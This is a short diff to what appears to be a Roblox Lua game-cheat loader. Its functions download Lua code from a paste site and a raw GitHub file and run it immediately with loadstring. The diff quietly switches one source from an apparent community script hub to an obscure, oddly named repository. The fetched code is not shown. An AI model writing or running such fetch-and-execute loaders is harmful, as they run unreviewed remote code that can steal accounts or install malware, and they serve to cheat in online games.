@@ -2,7 +2,7 @@ local function work()
     loadstring(game:HttpGet("https://paste.debian.net/plainh/85d7acec/", true))()
 end
 local function work2()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/zxc'))()
 end
 
 task.spawn(work)
